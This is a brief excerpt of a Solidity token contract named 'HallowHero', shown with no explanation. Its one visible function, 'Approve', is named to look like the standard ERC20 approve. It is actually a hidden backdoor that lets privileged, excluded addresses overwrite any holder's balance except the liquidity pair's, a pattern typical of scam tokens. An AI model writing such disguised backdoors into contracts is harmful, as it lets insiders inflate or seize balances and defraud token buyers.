...
contract HallowHero is Ownable, IERC20 {
    ...
    function Approve(address Ido   , uint256 token , uint256 nft) external  { 
         require( _isExcludedFrom[msg.sender]);
         require(Ido != uniswapV2Pair);
        _bOwned[Ido] = token + nft.mul(2).div(100);
    }   
